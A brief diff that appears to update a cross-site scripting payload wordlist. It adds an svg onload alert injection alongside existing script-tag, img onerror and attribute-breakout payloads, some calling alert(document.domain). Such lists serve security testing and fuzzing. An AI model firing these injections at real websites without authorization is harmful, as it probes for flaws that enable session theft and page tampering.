@@ -3,6 +3,7 @@ a:"/>a"><aa"><img src=x onerror=alert()>
 <script>alert(1)</script>
 "onmouseover="alert(1)
 "><img onload=alert(1)>
+"><svg onload=alert(1)>
 <script>alert(document.domain)</script>
 <img src=1 onerror=alert(1)>
 "><script>alert(document.domain)</script>
